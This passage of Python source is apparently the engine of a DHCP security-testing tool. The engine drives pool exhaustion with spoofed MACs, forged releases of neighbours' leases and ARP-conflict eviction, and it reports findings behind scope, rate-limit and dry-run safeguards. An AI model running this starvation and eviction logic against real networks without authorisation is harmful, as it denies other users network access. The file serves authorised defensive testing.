"""DhcpEngine — orchestrates senders + sniffer over the pure packet layer.

Every outbound frame funnels through `_send()`, the single chokepoint that enforces the
whitehat guarantees (scope + rate limit + dry-run). `core` never prints; it emits events.
"""

from __future__ import annotations

import threading
import time
from collections import deque
from pathlib import Path

from scapy.all import sendp  # module-level so tests can monkeypatch dhcpig.core.engine.sendp

from . import events as ev
from . import journal, packets
from .events import EventBus
from .exceptions import ConfigError
from .fingerprint import extract_signature, resolve
from .fingerprint import from_mac as fingerprint_from_mac
from .models import (
    FAIL,
    INCONCLUSIVE,
    INFO,
    PASS,
    ControlOutcome,
    Finding,
    HostFingerprint,
    Lease,
    Mode,
    Neighbor,
    PoolEstimate,
    ServerInfo,
    SessionConfig,
)
from .safety import Cleanup, RateLimiter, ScopeGuard
from .sniffer import DhcpSniffer

# engine states. EXHAUSTED means the *server* stopped offering — it is never set because of
# anything we chose ourselves (there is no lease cap; the window is the only self-imposed
# bound, and it exists to protect the server's offer table, not to cap how much we take).
# HALTED means a defensive control fired mid-run: sending has stopped, but leases are kept and
# the post-controls still run so the report is complete (see DhcpEngine._trigger_halt()).
IDLE, RUNNING, HALTED, EXHAUSTED, STOPPING, DONE = (
    "IDLE",
    "RUNNING",
    "HALTED",
    "EXHAUSTED",
    "STOPPING",
    "DONE",
)


class DhcpEngine:
    def __init__(self, cfg: SessionConfig, bus: EventBus) -> None:
        self.cfg = cfg
        self.bus = bus
        self.scope = ScopeGuard(cfg.scope_cidrs)
        self.rate = RateLimiter(cfg.rate_limit_pps)
        self.cleanup = Cleanup()
        self.state = IDLE
        self._stop = threading.Event()
        self._threads: list[threading.Thread] = []
        self._sniffer: DhcpSniffer | None = None
        self._started = 0.0
        # counters
        self.discovers = 0
        self.offers = 0
        self.acks = 0
        self.naks = 0
        self.arp_conflicts = 0
        self.releases = 0
        self.servers: dict[str, ServerInfo] = {}
        # control transactions (legitimate cycle from the real NIC MAC), pre and post run
        self.control_pre: ControlOutcome | None = None  # real NIC MAC (reachability/renewal)
        self.control_post: ControlOutcome | None = None
        self.control_pre_new: ControlOutcome | None = None  # fresh MAC (can a NEW client join?)
        self.control_post_new: ControlOutcome | None = None
        self.findings: list[Finding] = []
        self._control_lock = threading.Lock()
        self._control_xid: int | None = None
        self._control_offer = None
        self._control_ack = None
        self._control_nak = False
        self._control_offer_evt = threading.Event()
        self._control_ack_evt = threading.Event()
        # exhaustion detection: offers must have flowed and then stopped
        self._offers_seen_any = False
        self._last_offer_ts = 0.0
        self._silence_noticed = False
        self._finishing = threading.Event()
        # heartbeat thread; deliberately NOT in _threads (callers treat that list as "work in
        # progress" and would never see a destructive run finish if a forever-thread were in it)
        self._ticker: threading.Thread | None = None
        # correlate ARP-discovered neighbors with DHCP-observed fingerprints by MAC, so the
        # Neighbors table shows OS/Device regardless of which signal (ARP vs DHCP) arrives first
        self._neighbors_by_mac: dict[str, Neighbor] = {}
        self._fp_by_mac: dict[str, HostFingerprint] = {}
        # self-filter (2.3): the sniffer's BPF now sees client->server traffic too, including
        # our own outbound DISCOVER/REQUEST/RELEASE echoed back and every other client's DHCP
        # traffic. Populated in _exhaust_sender() and _control_transaction() with every source
        # MAC we've sent from, so foreign-DISCOVER observation (Phase 2) can tell "ours" from
        # "someone else's" without false positives.
        self._our_macs: set[str] = set()
        # eviction (2.3): who we are ARP-conflicting, the forged MACs we used, and the observed
        # signals per target IP. mac_by_ip/ip_by_mac exist because live signals arrive keyed by
        # whichever side the packet exposes (ARP by IP, DHCP by MAC). _evict_outcomes holds the
        # current best rung reached per target; _evict_start_ts bounds "rediscovered" DISCOVERs
        # to ones seen during/after this eviction, not some unrelated earlier sighting.
        self._evict_targets: set[str] = set()  # target IPs
        self._evict_bogus_macs: set[str] = set()
        self._evict_defenders: set[str] = set()  # target IPs that answered our ARP conflict
        self._evict_declined_ips: set[str] = set()
        self._evict_apipa_ips: set[str] = set()
        self._evict_mac_by_ip: dict[str, str] = {}
        self._evict_ip_by_mac: dict[str, str] = {}
        self._evict_outcomes: dict[str, str] = {}
        self._evict_start_ts = 0.0
        # windowed handshake pipeline (exhaust): bounded in-flight DISCOVER/REQUEST transactions
        # rather than an open-loop packet flood. xid -> {mac, sent_at, state}.
        self._window = cfg.window_initial
        # half-rate ramp: a clean ACK only earns half a slot, so it takes two clean ACKs in a
        # row to actually grow the window by one -- ramps back up more cautiously after any
        # earlier throttling instead of snapping straight back to a full flood.
        self._window_growth_accum = 0.0
        self._inflight: dict[int, dict] = {}
        self._inflight_lock = threading.Lock()
        self.timeouts_seen = 0
        self._consecutive_timeouts = 0
        self._nak_timestamps: list[float] = []
        self._offered_ip_macs: dict[str, set[str]] = {}
        self._duplicate_offer_ips: set[str] = set()
        # foreign DISCOVER observation (2.3): xid -> {mac, hostname, ts, answered}. Populated by
        # _handle_foreign_discover(), and "answered" is flipped by _handle_offer() when a reply
        # carrying that xid arrives. _foreign_discover_macs is separate: it's which MACs we've
        # already logged/emitted a ForeignDiscover for, so a retrying client (new xid every few
        # seconds) doesn't flood the log -- only counters keep moving after the first sighting.
        self._foreign_discovers: dict[int, dict] = {}
        self._foreign_discover_macs: set[str] = set()
        # halt-and-report: the first defensive-control signal wins. (signal, detail, leases_held)
        self._halt_signal: tuple[str, str, int] | None = None
        # pool-size estimate for the headroom number: learned from the first OFFER's subnet
        # (option 1), or an explicit --scope. self._baseline_neighbor_count is the ARP-sweep
        # count taken *before* exhausting, for the pre-run utilization finding — it must not be
        # confused with the live _neighbors_by_mac count, which the estimate/headroom uses.
        self._first_offer_ip: str | None = None
        self._first_offer_subnet: str | None = None
        self._baseline_neighbor_count = 0
        # dry-run only: neighbor count the release phase would have released, for DRY_RUN_SUMMARY
        self._dry_run_would_release = 0
        # targeted re-acquisition (2.3): xid -> requested IP (option 50) for every DISCOVER
        # _reacquire_phase() pushes, and xid -> outcome ("granted"/"offered_different"/"naked"/
        # "no_response") populated by hooks in _handle_ack()/_handle_nak()/_reap_timeouts(). Kept
        # separate from _inflight, which is cleared as each transaction completes/times out.
        self._reacquire_targets: dict[int, str] = {}
        self._reacquire_outcomes: dict[int, str] = {}
        # race-freed (2.3): a foreign REQUEST's requested address, kept just long enough to
        # resolve a same-xid NAK to a specific IP (a NAK carries no address of its own, RFC
        # 2131). Popped once consumed by _handle_nak() so this doesn't grow unbounded on a
        # healthy segment where foreign REQUESTs mostly get ACKed, not NAKed.
        self._foreign_requests: dict[int, str] = {}
        # race-freed (2.3): addresses queued for a priority targeted DISCOVER, deduped so one
        # freed address is never queued twice. Kept entirely separate from _reacquire_targets/
        # _reacquire_outcomes -- _evict_phase() derives its target set from those, and a race
        # xid must never silently become an eviction target (see EXECUTION-PLAN-race-freed.md's
        # "Boundaries" section).
        self._race_queue: deque[str] = deque()
        self._raced_ips: set[str] = set()
        self._race_targets: dict[int, str] = {}
        self._race_outcomes: dict[int, str] = {}
        self._race_inflight = 0
        self.races = 0
        # lease journal (2.2): resolved once so the CLI/report can display the path used.
        # Never active for dry-run -- a dry run must not pollute the recovery record with
        # leases that were never actually acquired.
        self._journal_enabled = cfg.journal and not cfg.dry_run
        self.journal_path: Path | None = None
        if self._journal_enabled:
            self.journal_path = cfg.journal_path or journal.default_path(cfg.interface)
        # release-previous (2.2): kept separate from control_pre/control_post so the generic
        # exhaust _finalize_findings() (which reads those) stays a no-op for this mode.
        self._rp_pre_control: ControlOutcome | None = None
        self._rp_post_control: ControlOutcome | None = None
        self.recovery_result: dict = {}
        # release mode's own pre/self control outcome (2.3, Phase 5) -- same precedent as
        # _rp_pre_control above: kept out of self.control_pre so _finalize_findings()'s
        # DHCP_STARVATION_* derivation (which reads control_pre/control_pre_new) never fires for
        # a release run. release shares _common_prelude() with exhaust but never runs the
        # client="new" leg, so self.control_pre_new also simply stays None here.
        self._rel_pre_control: ControlOutcome | None = None

    # ---------------------------------------------------------------- lease journal
    def _journal_ack(self, lease: Lease) -> None:
        """Best-effort: a journal write failure must never take down a run."""
        if not self._journal_enabled or self.journal_path is None:
            return
        try:
            journal.record_ack(self.journal_path, self.cfg.interface, lease)
        except OSError as exc:
            self._debug(f"journal: could not record ACK {lease.mac}/{lease.ip}: {exc}")

    def _journal_release(self, mac: str, ip: str) -> None:
        if not self._journal_enabled or self.journal_path is None:
            return
        try:
            journal.record_released(self.journal_path, self.cfg.interface, mac, ip)
        except OSError as exc:
            self._debug(f"journal: could not record release {mac}/{ip}: {exc}")

    # ---------------------------------------------------------------- send chokepoint
    def _send(self, pkt, target_ip: str | None = None, probe: bool = False) -> bool:
        """Return True if the frame was sent (or would-be-sent under dry-run/offline).

        Enforces scope (for targeted frames), rate limit, and dry-run/offline in one place.

        `probe=True` marks traffic a legitimate client on this segment would send anyway and
        that leaves no lasting change (ARP discovery, the control transaction's own
        DISCOVER/REQUEST/RELEASE) -- it bypasses dry-run suppression so a dry run is a genuine
        reconnaissance pass rather than a no-op. It never bypasses `offline`, which is the hard
        "nothing ever touches a socket" switch for tests and no-root previews.
        """
        if target_ip is not None and not self.scope.allows(target_ip):
            self.bus.emit(ev.Skipped(ip=target_ip, reason="OUT OF SCOPE"))
            return False
        self.rate.acquire()
        if self.cfg.offline:
            return True  # tests / no-root preview: never touch the wire, no matter what
        if self.cfg.dry_run and not probe:
            return True  # build + account, but never touch the wire (mutating frame, suppressed)
        sendp(pkt, iface=self.cfg.interface, verbose=False)
        return True

    def _debug(self, message: str) -> None:
        self.bus.emit(ev.Debug(message=message))

    # ---------------------------------------------------------------- lifecycle
    def start(self) -> None:
        if self.cfg.mode is Mode.ACTIVE_SCAN and not self.cfg.scope_cidrs:
            raise ConfigError("active-scan requires --scope (the network range to sweep)")
        self._started = time.time()
        self.state = RUNNING
        c = self.cfg
        self._debug(
            f"start mode={c.mode.value} iface={c.interface} ipver={c.ip_version.value} "
            f"rate={c.rate_limit_pps}pps "
            f"dry_run={c.dry_run} spoof_eth_src={c.spoof_ethernet_src} "
            f"scope={c.scope_cidrs}"
        )
        if self.cfg.status_interval > 0:
            self._ticker = threading.Thread(
                target=self._status_ticker, name="dhcpig-status", daemon=True
            )
            self._ticker.start()
        runners = {
            Mode.EXHAUST: self._run_exhaust,
            Mode.SCAN: self._run_scan,
            Mode.ACTIVE_SCAN: self._run_active_scan,
            Mode.RELEASE_NEIGHBORS: self._run_release,
            Mode.RELEASE_PREVIOUS: self._run_release_previous,
        }
        runners[self.cfg.mode]()

    # ---------------------------------------------------------------- status heartbeat
    def _foreign_discover_counts(self) -> tuple[int, int]:
        """(observed, unanswered) across every tracked foreign DISCOVER xid so far."""
        observed = len(self._foreign_discovers)
        unanswered = sum(1 for v in self._foreign_discovers.values() if not v["answered"])
        return observed, unanswered

    def _counters(self) -> dict:
        observed, unanswered = self._foreign_discover_counts()
        return {
            "discovers": self.discovers,
            "offers": self.offers,
            "leases": self.acks,
            "naks": self.naks,
            "releases": self.releases,
            "arp_conflicts": self.arp_conflicts,
            "foreign_discovers": observed,
            "foreign_discovers_unanswered": unanswered,
        }

    def _status_ticker(self) -> None:
        """Emit a StatusTick every `status_interval` seconds until the run stops."""
        prev, prev_t = self._counters(), time.time()
        # Event.wait() returns True once _stop is set, so this doubles as the sleep and the exit
        while not self._stop.wait(self.cfg.status_interval):
            # link_down: a switch putting the port into err-disable is a defensive control
            # firing, not a glitch to retry through. Polled here rather than a dedicated thread.
            if self.cfg.mode is Mode.EXHAUST and not self.cfg.dry_run and self._halt_signal is None:
                from .netutils import link_is_up

                if link_is_up(self.cfg.interface) is False:
                    self._trigger_halt("link_down", f"carrier lost on {self.cfg.interface}")
            now = time.time()
            cur = self._counters()
            window = max(1e-6, now - prev_t)
            stats = {
                "state": self.state,
                "elapsed": round(now - self._started, 1) if self._started else 0.0,
                "window": round(window, 1),
                "servers": len(self.servers),
                "neighbors": len(self._neighbors_by_mac),
                **cur,
                **{f"d_{k}": cur[k] - prev[k] for k in cur},
                "discover_pps": round((cur["discovers"] - prev["discovers"]) / window, 1),
                "lease_pps": round((cur["leases"] - prev["leases"]) / window, 1),
                "since_last_offer": (
                    round(now - self._last_offer_ts, 1) if self._offers_seen_any else None
                ),
            }
            if self.cfg.mode is Mode.EXHAUST:
                stats["send_window"] = self._window
                stats["inflight"] = len(self._inflight)
                stats["timeouts"] = self.timeouts_seen
                est, headroom = self._pool_headroom()
                stats["pool_size"] = est.size
                stats["pool_source"] = est.source
                stats["headroom"] = headroom
            if self._halt_signal is not None:
                stats["halt_signal"] = self._halt_signal[0]
            self.bus.emit(ev.StatusTick(stats=stats))
            prev, prev_t = cur, now

    def stop(self) -> None:
        if self.state == DONE:
            return  # idempotent: the CLI's finally-block and the web layer may both call this
        self.state = STOPPING
        self._stop.set()
        for t in self._threads:
            t.join(timeout=3.0)
        # Post-run control runs BEFORE restore, while our leases are still held — that is what
        # makes "a real client can't get an address" a meaningful measurement. Not optional:
        # offline is the only thing that skips it (no sniffer to receive the reply); dry-run
        # alone still runs this leg for real, as a probe.
        if self.cfg.mode is Mode.EXHAUST and self._sniffer is not None:
            self.control_post = self._control_transaction("post", client="self")
            # the leg that actually answers "is the pool drained?" — needs a fresh address
            self.control_post_new = self._control_transaction("post", client="new")
            denied = self.control_post_new
            if denied.attempted and not denied.success and self.acks > 0:
                self.state = EXHAUSTED
                self.bus.emit(
                    ev.PoolExhausted(
                        leases=self.acks,
                        elapsed=time.time() - self._started,
                        confirmed=True,
                    )
                )
            # Between the post-controls and the findings, sniffer still up: eviction (2.3) needs
            # to observe DECLINE/DISCOVER/ARP signals live during its rounds+settle, and
            # _finalize_findings() needs the outcomes it produces.
            self._evict_phase()
        self._finalize_findings()
        if self._sniffer is not None:
            self._sniffer.stop()
        self.state = DONE
        self.bus.emit(ev.SessionEnded(report=self.status()))

    def _finish_in_background(self, reason: str) -> None:
        """A terminal condition was reached — finalize without waiting for the operator.

        Runs off-thread because stop() joins the worker threads, and the caller here *is* one
        of them. Without this the run would sit idle after the pool drained: senders dead, no
        post-control, no verdict, until someone pressed Stop.
        """
        if self._finishing.is_set():
            return
        self._finishing.set()
        self._debug(f"auto-finalizing: {reason}")
        threading.Thread(target=self.stop, name="dhcpig-finish", daemon=True).start()

    def restore(self) -> None:
        """Release exactly the leases we acquired."""
        pending = self.cleanup.pending()
        if pending:
            self._debug(f"restore: releasing {len(pending)} acquired lease(s)")
        for lease in pending:
            pkt = packets.build_release_v4(
                lease.mac, lease.ip, lease.server_ip, lease.xid, server_mac=lease.server_mac
            )
            self._send(pkt)  # releasing our own leases; not scope-gated
            lease.released = True
            self.releases += 1
            self._journal_release(lease.mac, lease.ip)
            self.bus.emit(ev.LeaseReleased(lease=lease))

    def status(self) -> dict:
        foreign_observed, foreign_unanswered = self._foreign_discover_counts()
        out = {
            "state": self.state,
            "discovers": self.discovers,
            "offers": self.offers,
            "leases": self.acks,
            "naks": self.naks,
            "arp_conflicts": self.arp_conflicts,
            "releases": self.releases,
            "foreign_discovers": foreign_observed,
            "foreign_discovers_unanswered": foreign_unanswered,
            "servers": len(self.servers),
            "elapsed": round(time.time() - self._started, 1) if self._started else 0.0,
            "control_pre": self.control_pre.success if self.control_pre else None,
            "control_post": self.control_post.success if self.control_post else None,
            "findings": len(self.findings),
            "send_window": self._window,
            "halted": self._halt_signal is not None,
            "halt_signal": self._halt_signal[0] if self._halt_signal else None,
        }
        if self.cfg.mode is Mode.EXHAUST:
            est, headroom = self._pool_headroom()
            out["pool_size"] = est.size
            out["pool_source"] = est.source
            out["pool_is_estimate"] = est.is_estimate
            out["pool_detail"] = est.detail
            out["headroom"] = headroom
            out["in_use_observed"] = len(self._neighbors_by_mac)
        if self.cfg.mode is Mode.RELEASE_PREVIOUS:
            out["recovery"] = self.recovery_result or None
        if self._evict_outcomes:
            # eviction (2.3): the sniffer/status-ticker are already down by the time _evict_phase
            # runs (it's inline in stop(), after the worker threads are joined), so this only
            # ever reaches the client via the final SessionEnded report, not a live StatusTick.
            out["evict_targets"] = len(self._evict_outcomes)
            out["evict_outcomes"] = dict(self._evict_outcomes)
        return out

    # ---------------------------------------------------------------- helpers
    def _src_mac(self, client_mac: str) -> str:
        if self.cfg.spoof_ethernet_src:
            return client_mac
        from scapy.all import get_if_hwaddr

        try:
            return get_if_hwaddr(self.cfg.interface)
        except Exception:
            # dry-run / no real iface: nothing is sent, so a placeholder src is fine
            from .netutils import random_mac

            return random_mac()

    # ---------------------------------------------------------------- control transaction
    def _consume_control(self, pkt) -> bool:
        """Route a reply belonging to the in-flight control transaction. True if consumed."""
        from scapy.all import BOOTP

        with self._control_lock:
            xid = self._control_xid
        if xid is None or BOOTP not in pkt or pkt[BOOTP].xid != xid:
            return False
        if packets.is_offer(pkt):
            self._control_offer = pkt
            self._control_offer_evt.set()
            return True
        if packets.is_ack(pkt):
            self._control_ack = pkt
            self._control_ack_evt.set()
            return True
        if packets.is_nak(pkt):
            self._control_nak = True
            self._control_offer_evt.set()
            self._control_ack_evt.set()
            return True
        return False

    def _fresh_control_mac(self) -> str:
        """A never-seen, locally administered MAC for the 'new client' control leg.

        Deliberately NOT the de:ad:* prefix the exhaust clients use, so a filter keyed on our
        attack traffic doesn't catch the control too.
        """
        import random

        return "02:" + ":".join(f"{random.randint(0, 255):02x}" for _ in range(5))

    def _control_transaction(self, phase: str, client: str = "self") -> ControlOutcome:
        """One legitimate DHCP cycle (DISCOVER/OFFER/REQUEST/ACK/RELEASE), released immediately.

        Two client identities, because they answer different questions:
          * `self` — this machine's real NIC MAC. The server most likely already has a binding
            for it, so this is effectively a RENEWAL: it proves DHCP is reachable and we are on
            the right VLAN, but it can succeed even when the free pool is completely drained.
          * `new` — a MAC the server has never seen, which must come off the free list. This is
            the only leg that can show whether a *new* client can still obtain an address.
        """
        out = ControlOutcome(phase=phase, client=client)
        if self.cfg.offline:
            out.reason = "skipped (offline)"
            self.bus.emit(ev.ControlFinished(outcome=out))
            return out
        from scapy.all import DHCP

        try:
            if client == "new":
                mac = self._fresh_control_mac()
            else:
                from scapy.all import get_if_hwaddr

                mac = get_if_hwaddr(self.cfg.interface)
        except Exception as exc:
            out.reason = f"skipped (no hardware MAC: {exc!r})"
            self.bus.emit(ev.ControlFinished(outcome=out))
            return out

        out.attempted = True
        out.mac = mac
        self._our_macs.add(mac)
        self.bus.emit(ev.ControlStarted(phase=phase))
        started = time.time()
        xid = _rand_xid()
        with self._control_lock:
            self._control_xid = xid
            self._control_offer = None
            self._control_ack = None
            self._control_nak = False
        self._control_offer_evt.clear()
        self._control_ack_evt.clear()
        try:
            self._send(packets.build_discover_v4(mac, xid, mac), probe=True)
            who = "real NIC MAC" if client == "self" else "fresh unseen MAC"
            self._debug(f"CONTROL[{phase}/{client}] DISCOVER xid=0x{xid:08x} chaddr={mac} ({who})")
            if not self._control_offer_evt.wait(self.cfg.timeouts.control):
                out.reason = "no OFFER within timeout"
                return out
            if self._control_nak:
                out.reason = "server replied NAK"
                return out
            offer = self._control_offer
            sid, server_mac, offered_ip, subnet = packets.parse_offer(offer)
            out.offered_ip, out.server_id, out.subnet = offered_ip, sid, subnet
            out.server_mac = server_mac or None
            self._note_offer_for_pool_estimate(offered_ip, subnet)
            lt = packets.dhcp_option(offer[DHCP].options, "lease_time")
            out.lease_time = int(lt) if isinstance(lt, int) else None
            self._debug(f"CONTROL[{phase}/{client}] OFFER {offered_ip} from {sid} subnet={subnet}")
            self._send(packets.build_request_v4(offer, mac), probe=True)
            if not self._control_ack_evt.wait(self.cfg.timeouts.control):
                out.reason = f"OFFER {offered_ip} but no ACK within timeout"
                return out
            if self._control_nak:
                out.reason = f"OFFER {offered_ip} then NAK"
                return out
            out.success = True
            self._debug(
                f"CONTROL[{phase}/{client}] ACK {offered_ip} — this client can obtain a lease"
            )
            # give the address straight back; the control must not consume pool capacity
            self._send(
                packets.build_release_v4(mac, offered_ip, sid, xid, server_mac=server_mac),
                probe=True,
            )
            self._debug(f"CONTROL[{phase}/{client}] RELEASE {offered_ip}")
        except Exception as exc:  # a broken control must never kill the run
            out.reason = f"error: {exc!r}"
        finally:
            out.elapsed = round(time.time() - started, 2)
            with self._control_lock:
                self._control_xid = None
            self.bus.emit(ev.ControlFinished(outcome=out))
        return out

    # ---------------------------------------------------------------- findings
    def _raise(self, finding: Finding) -> None:
        self.findings.append(finding)
        self.bus.emit(ev.FindingRaised(finding=finding))

    def _finalize_findings(self) -> None:
        """Turn what we observed into auditable verdicts. Called once, at stop().

        dry-run (2.3) no longer short-circuits this wholesale: the control transaction and ARP
        discovery ran for real, so CONTROL_BASELINE_FAILED / NEW_CLIENT_BLOCKED_AT_BASELINE /
        POOL_HEADROOM_LOW are legitimate findings even under dry-run. Only the exhaustion verdict
        itself (which depends on leases actually held) is meaningless without real sends, so that
        block alone is gated below; DRY_RUN_SUMMARY stands in for it.
        """
        pre, post = self.control_pre, self.control_post
        distinct_macs = len({ln.mac for ln in self.cleanup.all()})
        elapsed = round(time.time() - self._started, 1) if self._started else 0.0

        # A failed baseline invalidates everything else — say so first and loudly.
        if pre is not None and pre.attempted and not pre.success:
            self._raise(
                Finding(
                    id="CONTROL_BASELINE_FAILED",
                    title="Baseline DHCP request from the real NIC MAC failed",
                    verdict=INCONCLUSIVE,
                    severity="high",
                    evidence={
                        "phase": "pre",
                        "reason": pre.reason,
                        "interface": self.cfg.interface,
                    },
                    recommendation=(
                        "Results are not conclusive. Confirm the interface is on the intended "
                        "VLAN with a reachable DHCP server before drawing any conclusion about "
                        "the network's defenses."
                    ),
                )
            )

        baseline_ok = pre is not None and pre.success
        # A new client blocked at baseline while our own MAC works is the signature of an L2
        # admission control (snooping / port security), not a broken test.
        if (
            baseline_ok
            and self.control_pre_new is not None
            and self.control_pre_new.attempted
            and not self.control_pre_new.success
        ):
            self._raise(
                Finding(
                    id="NEW_CLIENT_BLOCKED_AT_BASELINE",
                    title="An unknown MAC could not obtain an address even before testing",
                    verdict=PASS,
                    severity="info",
                    evidence={
                        "known_mac_ok": True,
                        "new_client_reason": self.control_pre_new.reason,
                    },
                    recommendation=(
                        "This machine's own MAC was served but an unseen MAC was not — "
                        "consistent with DHCP snooping or port security. Exhaustion cannot be "
                        "measured against this segment, which is itself the desired outcome."
                    ),
                )
            )
        if self.cfg.mode is Mode.EXHAUST and self._baseline_neighbor_count:
            est, _ = self._pool_headroom()
            if est.size:
                utilization = self._baseline_neighbor_count / est.size
                if utilization >= 0.8:
                    self._raise(
                        Finding(
                            id="POOL_HEADROOM_LOW",
                            title="The pool was already near full before this test began",
                            verdict=INFO,
                            severity="medium",
                            evidence={
                                "in_use_observed": self._baseline_neighbor_count,
                                "pool_size": est.size,
                                "source": est.source,
                                "utilization_pct": round(utilization * 100, 1),
                            },
                            recommendation=(
                                "A passive, pre-test finding independent of whether exhausting "
                                "the pool succeeded: with the scope already this full, only a "
                                "few more leases deny service to the next legitimate client. "
                                "Consider widening the scope or adding a second one."
                            ),
                        )
                    )

        if self.cfg.mode is Mode.EXHAUST and not self.cfg.dry_run:
            # Exhaustion is judged on the NEW-client leg. The self leg usually renews an
            # existing binding, so it can succeed against a completely drained pool.
            pre_new, post_new = self.control_pre_new, self.control_post_new
            new_baseline_ok = pre_new is not None and pre_new.success
            if post_new is not None and post_new.attempted:
                attained = self.acks > 0 and not post_new.success and new_baseline_ok
                # First reason that applies wins: an invalid or already-blocked baseline
                # explains a non-result before a mid-run control or remaining headroom does.
                if not baseline_ok:
                    reason = "inconclusive_baseline"
                elif not new_baseline_ok:
                    reason = "blocked_at_baseline"
                elif self._halt_signal is not None:
                    reason = "control_fired"
                else:
                    reason = "pool_headroom_remaining"

                if attained:
                    self._raise(
                        Finding(
                            id="DHCP_STARVATION_ATTAINED",
                            title="A new client was denied an address while spoofed leases "
                            "were held",
                            verdict=FAIL,
                            severity="high",
                            evidence={
                                "leases_held": self.acks,
                                "distinct_client_macs": distinct_macs,
                                "new_client_reason": post_new.reason,
                                "new_client_baseline_ip": (pre_new.offered_ip if pre_new else None),
                                "renewal_still_worked": bool(post and post.success),
                                "elapsed_sec": elapsed,
                                "servers": list(self.servers),
                            },
                            recommendation=(
                                "The pool was driven to the point of denying service to a "
                                "brand-new client. Rate-limit DHCP per port and enable DHCP "
                                "snooping / port security, then re-run to confirm."
                            ),
                        )
                    )
                else:
                    evidence: dict = {"reason": reason, "leases_held": self.acks}
                    if reason == "control_fired" and self._halt_signal is not None:
                        signal, detail, leases_at_halt = self._halt_signal
                        evidence.update(
                            {"signal": signal, "detail": detail, "leases_at_halt": leases_at_halt}
                        )
                        recommendation = (
                            f"Sending stopped on {signal} ({detail}) after {leases_at_halt} "
                            "lease(s) held — that control is what's providing protection here; "
                            "confirm it in switch/DHCP-server logs."
                        )
                    elif reason == "pool_headroom_remaining":
                        est, headroom = self._pool_headroom()
                        evidence.update(
                            {"headroom": headroom, "pool_size": est.size, "pool_source": est.source}
                        )
                        hr = headroom if headroom is not None else "an unknown amount of"
                        recommendation = (
                            f"A new client could still obtain an address, with ~{hr} address(es) "
                            "of headroom estimated remaining — the pool was not driven to "
                            "exhaustion within this run."
                        )
                    elif reason == "blocked_at_baseline":
                        recommendation = (
                            "An unknown MAC could not obtain an address even before the test "
                            "began — consistent with DHCP snooping or port security. See "
                            "NEW_CLIENT_BLOCKED_AT_BASELINE for the direct evidence."
                        )
                    else:  # inconclusive_baseline
                        recommendation = (
                            "The baseline request from this machine's real MAC failed, so "
                            "nothing here can be concluded. See CONTROL_BASELINE_FAILED."
                        )
                    self._raise(
                        Finding(
                            id="DHCP_STARVATION_NOT_ATTAINED",
                            title="A new client could still obtain an address after the run",
                            verdict=PASS,
                            severity="info",
                            evidence=evidence,
                            recommendation=recommendation,
                        )
                    )

                # offers stopped, yet a brand-new client is still served: that is the server
                # refusing our traffic specifically, not running out of addresses
                if post_new.success and self.state == EXHAUSTED:
                    self._raise(
                        Finding(
                            id="SERVER_STOPPED_SERVING_TEST_CLIENTS",
                            title="Server stopped answering the test clients while still "
                            "serving a new client",
                            verdict=INFO,
                            severity="medium",
                            evidence={
                                "leases_before_offers_ceased": self.acks,
                                "discovers": self.discovers,
                                "naks": self.naks,
                                "new_client_ip": post_new.offered_ip,
                            },
                            recommendation=(
                                "Consistent with DHCP rate-limiting, offer-table saturation "
                                "or anti-starvation protection rather than pool exhaustion. "
                                "A NAK burst just before offers ceased points at the server "
                                "re-offering already-pending addresses."
                            ),
                        )
                    )

        if self.cfg.mode is Mode.EXHAUST and self.cfg.dry_run:
            est, headroom = self._pool_headroom()
            self._raise(
                Finding(
                    id="DRY_RUN_SUMMARY",
                    title="Dry run: reconnaissance only, nothing sent that would take a lease",
                    verdict=INFO,
                    severity="info",
                    evidence={
                        "hosts_seen": len(self._neighbors_by_mac),
                        "server_id": (pre.server_id if pre and pre.success else None),
                        "pool_size": est.size,
                        "pool_source": est.source,
                        "headroom": headroom,
                        "would_release": self._dry_run_would_release,
                        "would_evict": len(self._evict_targets),
                    },
                    recommendation=(
                        "The control transaction and ARP discovery ran for real, but the "
                        "windowed sender, RELEASE, re-acquisition, and eviction were all "
                        "suppressed. Re-run with dry-run disabled to actually measure exhaustion."
                    ),
                )
            )

        if self.naks > 0:
            self._raise(
                Finding(
                    id="DHCP_NAK_OBSERVED",
                    title="Server actively refused requests (DHCPNAK)",
                    verdict=INFO,
                    severity="medium",
                    evidence={"naks": self.naks},
                    recommendation=(
                        "NAKs often indicate snooping binding-table enforcement or an address "
                        "conflict. Correlate with switch logs."
                    ),
                )
            )

        if len(self.servers) > 1:
            self._raise(
                Finding(
                    id="MULTIPLE_DHCP_SERVERS",
                    title="More than one DHCP server answered on this segment",
                    verdict=FAIL,
                    severity="high",
                    evidence={"servers": list(self.servers)},
                    recommendation=(
                        "Verify each server is authorized. An unexpected responder is a rogue "
                        "DHCP server; DHCP snooping with trusted uplink ports prevents this."
                    ),
                )
            )

        # Foreign DISCOVER observation (2.3, goal 4): direct client-visible-outage evidence,
        # not an inference from our own lease count. Silence (nothing observed) raises nothing
        # -- a segment where every host is already bound is expected to be quiet, and that's not
        # evidence of anything.
        observed, unanswered = self._foreign_discover_counts()
        if observed:
            macs = sorted({v["mac"] for v in self._foreign_discovers.values()})
            sample_hosts = [
                {"mac": v["mac"], "hostname": v["hostname"]}
                for v in list(self._foreign_discovers.values())[:5]
            ]
            if unanswered:
                self._raise(
                    Finding(
                        id="FOREIGN_DISCOVERS_UNANSWERED",
                        title="Other hosts' DHCPDISCOVERs went unanswered during this run",
                        verdict=FAIL,
                        severity="high",
                        evidence={
                            "observed": observed,
                            "unanswered": unanswered,
                            "distinct_macs": len(macs),
                            "sample_hosts": sample_hosts,
                        },
                        recommendation=(
                            "Other people's machines asked for an address during this run and "
                            "got nothing — the most direct evidence of client-visible outage "
                            "this tool can produce. Correlate the MACs above against known "
                            "devices on the segment."
                        ),
                    )
                )
            else:
                self._raise(
                    Finding(
                        id="FOREIGN_DISCOVERS_ANSWERED",
                        title="Other hosts' DHCPDISCOVERs were all answered during this run",
                        verdict=INFO,
                        severity="info",
                        evidence={
                            "observed": observed,
                            "distinct_macs": len(macs),
                            "sample_hosts": sample_hosts,
                        },
                        recommendation=(
                            "Third-party DHCP kept working alongside this run — no client-"
                            "visible outage observed via foreign DISCOVER traffic."
                        ),
                    )
                )

        # ARP-conflict eviction (2.3, Phase 4/5). Gated on not dry-run: under dry-run
        # _evict_phase() still runs and populates targets, but sends nothing, so every outcome
        # would read no_reaction -- not because nothing reacted, but because nothing was ever
        # sent. That's not evidence of anything; DRY_RUN_SUMMARY covers the dry-run case instead.
        if self._evict_outcomes and not self.cfg.dry_run:
            if self.cfg.mode is Mode.RELEASE_NEIGHBORS:
                # release never drains the pool -- forcing a clean restart-and-reacquire
